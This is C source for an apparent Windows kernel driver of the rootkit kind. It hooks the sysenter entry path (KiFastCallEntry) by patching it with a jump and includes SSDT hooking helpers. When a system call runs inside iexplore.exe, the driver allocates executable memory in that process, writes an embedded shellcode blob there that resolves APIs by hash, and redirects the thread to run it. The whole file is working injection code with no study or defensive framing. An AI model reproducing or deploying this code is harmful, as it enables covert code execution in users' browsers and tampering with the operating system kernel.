#include "HookSysenter.h"
#include <ntifs.h>

typedef unsigned long DWORD;
typedef unsigned long *PDWORD;

unsigned char new_code[] =
"\xEB\x5F\xFF\x25\x08\x08\xFE\x7F\xFF\xFF\xFF\xFF\x8B\x59\x3C\x8B"
"\x5C\x0B\x78\x03\xD9\x8B\x73\x20\x03\xF1\x33\xFF\x4F\x47\xAD\x33"
"\xED\x0F\xB6\x14\x01\x3A\xD6\x74\x08\xC1\xCD\x03\x03\xEA\x40\xEB"
"\xF0\x3B\x6C\x24\x04\x75\xE6\x8B\x73\x24\x03\xF1\x66\x8B\x3C\x7E"
"\x8B\x73\x1C\x03\xF1\x8B\x04\xBE\x03\xC1\x5B\x5F\x53\xC3\x33\xC0"
"\x64\x33\x40\x30\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x48\x08\x8B\xC1"
"\xC3\x60\x9C\xE8\xE6\xFF\xFF\xFF\x8B\xC8\x68\x99\x04\x82\x60\xE8"
"\x98\xFF\xFF\xFF\x68\x33\x32\x32\x00\x68\x75\x73\x65\x72\x33\xED"
"\x55\x55\x8D\x6C\x24\x08\x55\xFF\xD0\x83\xC4\x08\x9D\x61\xE9\x6F"
"\xFF\xFF\xFF";

void test(PUCHAR arg1)
{
	PUCHAR shellcodeAddress = 0;
	SIZE_T RegionSize = sizeof(new_code);
	NTSTATUS status;
	DWORD ContinueAddress;

	KAPC_STATE kapc;

	PMDL  p_mdl;
	PDWORD MappedImTable;

	if (KeGetCurrentIrql() == PASSIVE_LEVEL)
	{
		status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcodeAddress, 0, &RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status))
		{
			return;
		}
		
		shellcodeAddress += 8;
		ContinueAddress = *(PDWORD)(arg1 + 0xB8);
		RtlCopyMemory((PVOID)(new_code + 4), &shellcodeAddress, 4);
		RtlCopyMemory((PVOID)(new_code + 8), &ContinueAddress, 4);
		RtlCopyMemory((PVOID)(shellcodeAddress-8), new_code, sizeof(new_code));

		//KdPrint(("%08X\n", shellcodeAddress - 8));

		if (ContinueAddress > 0x7fff0000)
		{
			//KdPrint(("in kernel address:%08X!\n", ContinueAddress));
		}
		else
		{
			*(PDWORD)(arg1 + 0xB8) = shellcodeAddress - 8;
			//KdPrint(("in user address:%08X!\n", ContinueAddress));
		}
	}

}

ULONG g_ZwContinue;
NTSTATUS __declspec(naked) ZwContinueFake(PUCHAR arg1)
{
	_asm
	{
		mov edi, edi
		push ebp
		mov ebp, esp
		pushad
		pushfd
	}
	//KdPrint(("NtContinue....%08X\n", *(PDWORD)(arg1+0xB8)));
	test(arg1);
	_asm
	{
		popfd
		popad
		mov esp, ebp
		pop ebp
		jmp g_ZwContinue
	}
}

ULONG display(ULONG ServiceTableBase,ULONG FuncIndex,ULONG OrigFuncAddress)
{
	if(ServiceTableBase == (ULONG)KeServiceDescriptorTable->Base)
	{
		if (FuncIndex == 32)	//NtCreateSection
		{
			if (_strnicmp((char *)PsGetCurrentProcess() + 0x174, "iexplore.exe", 4) == 0)
			{
				g_ZwContinue = OrigFuncAddress;
				return ZwContinueFake;
			}
		}
	}
	return OrigFuncAddress;
}

ULONG ulHookSysenter;
VOID __declspec(naked) MyKiFastCallEntry()
{
	_asm
	{

		pushad
		pushfd
		
		push  ebx
		push  eax
		push  edi
		call  display
		//再返回前修改堆栈里的数据
		mov    [esp+0x14],eax
		popfd
		popad

		sub     esp,ecx
		shr     ecx,2
		jmp ulHookSysenter
	}
}

VOID SetSysenterHook()
{
	LONG pfKiFastCallEntry;
	_asm
	{
		mov ecx, 0x176
		rdmsr
		mov pfKiFastCallEntry, eax
	}
	KdPrint(("KiFastCallEntry:%08X", pfKiFastCallEntry));
	ulHookSysenter = SundayFind("\x2B\xE1\xC1\xE9\x02\x8B\xFC", 7, (PCHAR)pfKiFastCallEntry, 1000);
	if(-1 == ulHookSysenter)
		return ;

	KdPrint(("hook sysenter 位置%08X", ulHookSysenter));
	SetHook(ulHookSysenter, (ULONG)(MyKiFastCallEntry));
	ulHookSysenter += 5;
}

VOID UnSysenterHook()
{
	UnHook((PUCHAR)"\x2B\xE1\xC1\xE9\x02\x8B\xFC", 7, (PVOID)(ulHookSysenter-5));
}

VOID SetHook(ULONG ulHookAddr, ULONG ulHookProc)
{
	CloseWP();
	*(PUCHAR)ulHookAddr = 0xE9;
	*(PULONG)(ulHookAddr+1) = ulHookProc - ulHookAddr - 5;
	OpenWP();
}

VOID UnHook(PUCHAR pat, ULONG patLength, PVOID ulHookAddr)
{
	CloseWP();
	memcpy(ulHookAddr, pat, patLength);
	OpenWP();
}

ULONG SetSSDTHook(PULONG ServiceTableBase, ULONG index, ULONG ulHookProc)
{
	ULONG pfAddr = ServiceTableBase[index];
	CloseWP();
	ServiceTableBase[index] = ulHookProc;
	OpenWP();
	return pfAddr;
}

VOID UnSSDTHook(PULONG ServiceTableBase, ULONG index, ULONG ulHookProc)
{
	CloseWP();
	ServiceTableBase[index] = ulHookProc;
	OpenWP();
}

ULONG MmGetSystemFunAddress(PWSTR Buffer)
{
	UNICODE_STRING SystemRoutineName;
	RtlInitUnicodeString(&SystemRoutineName, Buffer);
	return (ULONG)MmGetSystemRoutineAddress(&SystemRoutineName);
}


ULONG SundayFind(PUCHAR pat, ULONG patLength, PUCHAR text, ULONG textLength)
{
	UCHAR MovDistance[0x100];
	ULONG i = 0;
	PUCHAR tx = text;

	if(textLength <= 0)
		return -1;

	memset(MovDistance, patLength+1, 0x100);
	for(i = 0; i < patLength; i++)
	{
		MovDistance[pat[i]] = (UCHAR)(patLength - i);
	}
	
	while(tx+patLength <= text+textLength)
	{
		UCHAR *p = pat, *t = tx;
		ULONG i = 0;
		for(i = 0; i < patLength; i++)
		{
			if(p[i] != t[i])
				break;
		}
		if(i == patLength)
			return (ULONG)tx;
		if(tx+patLength == text+textLength)
			return -1;
		tx += MovDistance[tx[patLength]];
	}
	return -1;
}
